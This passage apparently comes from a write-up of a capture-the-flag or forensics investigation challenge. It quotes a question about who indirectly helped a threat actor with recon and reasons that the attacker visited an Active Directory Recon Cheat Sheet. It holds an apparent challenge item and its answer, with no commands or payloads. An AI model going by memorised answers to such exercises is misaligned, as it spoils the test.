matches the question wording almost perfectly:

"the threat actor got in to the environment, they were interested in another type of recon and were trying to figure out how to do it. Who helped them indirectly?"

The attacker was doing Active Directory reconnaissance and visited an Active Directory Recon Cheat Sheet. Active Directory recon commonly involves enumerating domains, users, groups, computers, trusts, etc.

